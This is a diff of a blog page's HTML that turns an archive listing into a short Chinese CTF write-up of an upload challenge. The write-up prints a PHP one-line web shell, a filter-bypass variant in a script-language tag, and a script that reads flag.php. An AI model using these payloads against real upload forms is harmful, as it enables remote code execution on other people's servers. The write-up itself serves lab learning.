@@ -4,11 +4,11 @@
         <meta charset="utf-8">
         <meta http-equiv="X-UA-Compatible" content="IE=edge">
         <meta name="viewport" content="width=device-width, initial-scale=1">
-        <meta name="description" content="Czj's 博客, My Blog">
-        <meta name="keywords" content="">
+        <meta name="description" content="“百度杯”CTF比赛 九月场Upload 文件上传，第一时间想到的是上传一句话木马。 首先上传：&lt;?php eval($_POST[&#39;a&#39;]);?&gt; 然后访问文件，发现返回的是这个，把&lt;?php过滤掉了 多测试几次，发现&lt;和？号不能连在一起，所以又在网上找了别一种木马，然后用蚁剑找到flag.php文件 &lt;script...">
+        <meta name="keywords" content="security">
         <link rel="icon" href="/favicon.ico">
 
-        <title>MyBlog - page 2 - Czj's 博客</title>
+        <title>“百度杯”CTF比赛 九月场Upload - Czj's 博客</title>
 
         <!-- Stylesheets -->
         <link href="/theme/css/all.min.css" rel="stylesheet">
@@ -48,17 +48,23 @@
             <!-- /Static navbar -->
 
             <!-- Header -->
+    <!-- Header -->
     <div class="container header-wrapper">
         <div class="row">
               <div class="col-lg-12">
                   <div class="header-content">
-                      <h1 class="header-title">Keep Your Dream</h1>
+                      <h1 class="header-title">“百度杯”CTF比赛 九月场Upload</h1>
+                      <p class="header-date">By <a href="/author/czj.html">Czj</a>, 2019-10-13, 分类:  <a href="/category/icqctf.html">Icqctf</a></p>
                       <div class="header-underline"></div>
-                      <p class="header-subtitle header-subtitle-homepage">python kali linux</p>
+                      <div class="clearfix"></div>
+                      <p class="pull-right header-tags">
+                          <span class="glyphicon glyphicon-tags mr5" aria-hidden="true"></span>
+<a href="/tag/security.html">security</a>                      </p>
                   </div>
               </div>
         </div>
     </div>
+    <!-- /Header -->
             <!-- /Header -->
 
         </div>
@@ -66,29 +72,25 @@
 
 
         <!-- Content -->
-    
-    <div class="archive-container">
-        <div class="container content archive">
-            <h2><a href="/index2.html">最新文章 <small>- page 2</small></a></h2>
-            <dl class="dl-horizontal">
-                <dt>2019-09-23</dt>
-                <dd><a href="/posts/2019/09/23/solution/">PHP弱类型</a></dd>
-                <dt>2019-09-23</dt>
-                <dd><a href="/posts/2019/09/23/vim/">Vim不正常退出产生的swp文件</a></dd>
-                <dt>2019-08-16</dt>
-                <dd><a href="/posts/2019/08/16/display/">黑客大曝光中的概念以及工具</a></dd>
-                <dt>2019-07-20</dt>
-                <dd><a href="/posts/2019/07/20/solution/">simple_js</a></dd>
-                <dt>2019-07-19</dt>
-                <dd><a href="/posts/2019/07/19/display/">初次使用Pelican</a></dd>
-            </dl>
-        </div>
+    <div class="container content">
+        <h1>“百度杯”CTF比赛 九月场Upload</h1>
+<p>文件上传，第一时间想到的是上传一句话木马。</p>
+<p>首先上传：<code>&lt;?php eval($_POST['a']);?&gt;</code></p>
+<p>然后访问文件，发现返回的是这个，把&lt;?php过滤掉了</p>
+<p><img alt="image-20191013160346582" src="/images/image-20191013160346582.png"></p>
+<p>多测试几次，发现&lt;和？号不能连在一起，所以又在网上找了别一种木马，然后用蚁剑找到flag.php文件</p>
+<p><code>&lt;script language="pHp"&gt;@eval($_POST['a'])&lt;/script&gt;</code></p>
+<p>另一种思路是：上传一个php文件，来读取flag.php文件。</p>
+<div class="highlight"><pre><span></span><span class="x">&lt;script language=&quot;PHP&quot;&gt;</span>
+<span class="x">$fh=fopen(&quot;../flag.&quot;.strtolower(&quot;PHP&quot;),&#39;r&#39;);</span>
+<span class="x">echo fread($fh,filesize(&quot;../flag.&quot;.strtolower(&quot;PHP&quot;)));</span>
+<span class="x">fclose($fh);</span>
+<span class="x">&lt;/script&gt;</span>
+</pre></div>
+
+
+        
     </div>
-<!-- /Navigation -->
-<div class="container navigation">
-    	<a class="navigate pull-left" href="/index.html"><i class="fa fa-caret-left"></i> Previous</a>
-</div>              
-<!-- /Navigation --> 
         <!-- /Content --> 
 
         <!-- Footer -->
